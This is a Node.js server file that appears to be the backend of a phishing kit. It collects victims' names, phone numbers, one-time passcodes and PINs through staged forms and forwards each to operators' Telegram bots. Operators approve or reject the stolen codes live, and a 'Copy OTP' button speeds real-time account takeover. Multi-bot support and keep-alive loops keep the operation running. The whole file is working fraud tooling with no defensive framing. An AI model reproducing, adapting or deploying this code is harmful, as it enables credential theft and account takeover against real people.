require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 10000;
const DOMAIN = process.env.BACKEND_DOMAIN;

// ---------- IN-MEMORY STORES ----------
const phoneRequests = {};
const otpRequests = {};
const pinRequests = {};
const requestMeta = {};
const requestTimestamps = {};

// ---------- BOTS ----------
const bots = [];
Object.keys(process.env).forEach(key => {
  const match = key.match(/^BOT(\d+)_TOKEN$/);
  if (!match) return;
  const i = match[1];
  const token = process.env[`BOT${i}_TOKEN`];
  const chatId = process.env[`BOT${i}_CHATID`];
  if (token && chatId) bots.push({ botId: `bot${i}`, token, chatId });
});
console.log('✅ Bots loaded:', bots.map(b => b.botId));

// ---------- MIDDLEWARE ----------
app.use(express.json({ type: '*/*' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------- HELPERS ----------
function getBot(botId) {
  return bots.find(b => b.botId === botId);
}

async function sendTelegram(bot, text, buttons = []) {
  try {
    await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
      chat_id: bot.chatId,
      text,
      reply_markup: buttons.length ? { inline_keyboard: buttons } : undefined
    });
  } catch (e) {
    console.error('❌ Telegram error:', e.response?.data || e.message);
  }
}

async function answerCallback(bot, id, extra = {}) {
  try {
    await axios.post(
      `https://api.telegram.org/bot${bot.token}/answerCallbackQuery`,
      { callback_query_id: id, ...extra }
    );
  } catch {}
}

// ---------- WEBHOOK MANAGEMENT ----------
async function setWebhook(bot) {
  if (!DOMAIN) {
    console.warn('⚠️ BACKEND_DOMAIN missing – webhook not set');
    return false;
  }
  const url = `${DOMAIN}/telegram-webhook/${bot.botId}`;
  try {
    const resp = await axios.get(
      `https://api.telegram.org/bot${bot.token}/setWebhook?url=${url}`
    );
    if (resp.data.ok) {
      console.log(`✅ Webhook set for ${bot.botId} -> ${url}`);
      return true;
    } else {
      console.error(`❌ Webhook failed for ${bot.botId}:`, resp.data.description);
      return false;
    }
  } catch (e) {
    console.error('❌ Webhook error:', e.response?.data || e.message);
    return false;
  }
}

async function verifyAndRepairWebhook(bot) {
  try {
    const resp = await axios.get(`https://api.telegram.org/bot${bot.token}/getWebhookInfo`);
    const info = resp.data.result;
    const expected = `${DOMAIN}/telegram-webhook/${bot.botId}`;
    if (info.url !== expected || info.last_error_message || info.pending_update_count > 10) {
      console.log(`🔧 Repairing webhook for ${bot.botId} (error: ${info.last_error_message || 'none'})`);
      await setWebhook(bot);
    }
  } catch (e) {
    console.error('Webhook verify error:', e.message);
  }
}

async function setAllWebhooks() {
  for (const bot of bots) await setWebhook(bot);
}

// ---------- KEEP-ALIVE (prevents free-tier sleep) ----------
async function pingSelf() {
  if (!DOMAIN) return;
  try {
    await axios.get(`${DOMAIN}/health`);
    console.log('💓 Self-ping OK');
  } catch (e) {
    console.log('💔 Self-ping failed:', e.message);
  }
}

// ---------- PHONE STEP ----------
app.post('/submit-phone', (req, res) => {
  try {
    const { name, phone, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    phoneRequests[requestId] = null;
    requestMeta[requestId] = { name, phone, botId };
    requestTimestamps[requestId] = Date.now();

    sendTelegram(
      bot,
      `📱 PHONE VERIFICATION\n👤 Name: ${name}\n📞 Phone: ${phone}\n🆔 Ref: ${requestId}`,
      [
        [
          { text: '✅ Approve', callback_data: `phone_ok:${requestId}` },
          { text: '❌ Reject', callback_data: `phone_bad:${requestId}` }
        ]
      ]
    );

    res.json({ requestId });
  } catch {
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/check-phone/:id', (req, res) => {
  const result = phoneRequests[req.params.id];
  // 🔥 FIX: return { approved: true } instead of { redirect: 'link.html' }
  if (result === true) return res.json({ approved: true });
  if (result === false) return res.json({ approved: false });
  res.json({ approved: null });
});

// ---------- OTP STEP ----------
app.post('/submit-otp', (req, res) => {
  try {
    const { name, phone, otp, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    otpRequests[requestId] = null;
    requestMeta[requestId] = { name, phone, otp, botId };
    requestTimestamps[requestId] = Date.now();

    sendTelegram(
      bot,
      `🔐 OTP VERIFICATION\n👤 Name: ${name}\n📞 Phone: ${phone}\n🔢 OTP: ${otp}\n🆔 Ref: ${requestId}`,
      [
        [
          { text: '✅ Correct OTP', callback_data: `otp_ok:${requestId}` },
          { text: '❌ Wrong OTP', callback_data: `otp_bad:${requestId}` }
        ],
        [
          { text: '📋 Copy OTP', callback_data: `copy_otp:${requestId}` }
        ]
      ]
    );

    res.json({ requestId });
  } catch {
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/check-otp/:id', (req, res) => {
  res.json({ approved: otpRequests[req.params.id] ?? null });
});

// ---------- PIN STEP ----------
app.post('/submit-pin', (req, res) => {
  try {
    const { name, phone, pin, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    pinRequests[requestId] = null;
    requestMeta[requestId] = { name, phone, botId };
    requestTimestamps[requestId] = Date.now();

    sendTelegram(
      bot,
      `🔐 PIN VERIFICATION\n👤 Name: ${name}\n📞 Phone: ${phone}\n🔢 PIN: ${pin}\n🆔 Ref: ${requestId}`,
      [
        [
          { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
          { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
        ]
      ]
    );

    res.json({ requestId });
  } catch {
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/check-pin/:id', (req, res) => {
  res.json({ approved: pinRequests[req.params.id] ?? null });
});

// ---------- TELEGRAM CALLBACK WEBHOOK ----------
app.post('/telegram-webhook/:botId', async (req, res) => {
  try {
    const bot = getBot(req.params.botId);
    if (!bot) {
      console.warn(`⚠️ Unknown bot ID: ${req.params.botId}`);
      return res.sendStatus(200);
    }

    const cb = req.body.callback_query;
    if (!cb) return res.sendStatus(200);

    const [action, requestId] = cb.data.split(':');
    const meta = requestMeta[requestId];

    if (!meta) {
      await answerCallback(bot, cb.id, {
        text: '⏳ This request has expired or already been processed.',
        show_alert: true
      });
      return res.sendStatus(200);
    }

    // ---------- Copy OTP ----------
    if (action === 'copy_otp') {
      if (meta.otp) {
        await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
          chat_id: cb.message.chat.id,
          text: `📋 Copy this OTP:\n<code>${meta.otp}</code>`,
          parse_mode: 'HTML'
        });
        await answerCallback(bot, cb.id, { text: '✅ OTP sent above', show_alert: false });
      } else {
        await answerCallback(bot, cb.id, { text: '❌ OTP not found', show_alert: true });
      }
      return res.sendStatus(200);
    }

    // ---------- Decisions ----------
    let feedback = '';
    if (action === 'phone_ok') {
      phoneRequests[requestId] = true;
      feedback = '✅ Phone approved – redirecting to OTP page';
    }
    if (action === 'phone_bad') {
      phoneRequests[requestId] = false;
      feedback = '❌ Phone rejected';
    }
    if (action === 'otp_ok') {
      otpRequests[requestId] = true;
      feedback = '✅ OTP approved – redirecting to PIN page';
    }
    if (action === 'otp_bad') {
      otpRequests[requestId] = false;
      feedback = '❌ OTP rejected';
    }
    if (action === 'pin_ok') {
      pinRequests[requestId] = true;
      feedback = '✅ PIN approved – redirecting to success page';
    }
    if (action === 'pin_bad') {
      pinRequests[requestId] = false;
      feedback = '❌ PIN rejected';
    }

    if (feedback) {
      await sendTelegram(
        bot,
        `📝 ACTION TAKEN\n👤 Name: ${meta.name || '—'}\n📞 Phone: ${meta.phone || '—'}\n${feedback}`
      );
    }

    await answerCallback(bot, cb.id);
    res.sendStatus(200);

  } catch (err) {
    console.error('🔥 Webhook handler crashed:', err.message);
    res.sendStatus(200);
  }
});

// ---------- BOT ENTRY POINT ----------
app.get('/bot/:botId', (req, res) => {
  const bot = bots.find(b => b.botId === req.params.botId);
  if (!bot) return res.status(404).send('Invalid bot');
  res.redirect(`/index.html?botId=${bot.botId}`);
});

// ---------- HEALTH & DEBUG ----------
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    bots: bots.length,
    webhookDomain: DOMAIN || 'not set',
    uptime: process.uptime()
  });
});

app.get('/debug/bot', (req, res) => {
  res.json({
    count: bots.length,
    bots: bots.map(b => ({ botId: b.botId, chatId: b.chatId }))
  });
});

// ---------- CLEANUP OLD REQUESTS (TTL) ----------
setInterval(() => {
  const now = Date.now();
  const TTL = 10 * 60 * 1000; // 10 minutes
  for (const [id, ts] of Object.entries(requestTimestamps)) {
    if (now - ts > TTL) {
      delete phoneRequests[id];
      delete otpRequests[id];
      delete pinRequests[id];
      delete requestMeta[id];
      delete requestTimestamps[id];
    }
  }
}, 60000);

// ---------- WEBHOOK REPAIR LOOP ----------
setInterval(async () => {
  for (const bot of bots) {
    await verifyAndRepairWebhook(bot);
  }
}, 5 * 60 * 1000);

// ---------- START ----------
(async function bootstrap() {
  if (!DOMAIN) {
    console.error('❌ BACKEND_DOMAIN environment variable is NOT set! Webhooks will fail.');
  } else if (!DOMAIN.startsWith('https://')) {
    console.warn('⚠️ Domain is not HTTPS – Telegram may reject webhooks!');
  }

  await setAllWebhooks();

  app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    setTimeout(async () => {
      for (const bot of bots) {
        try {
          const resp = await axios.get(`https://api.telegram.org/bot${bot.token}/getWebhookInfo`);
          console.log(`🔍 ${bot.botId} webhook:`, resp.data.result);
        } catch (e) {}
      }
    }, 2000);
  });

  setInterval(pingSelf, 4 * 60 * 1000);
})();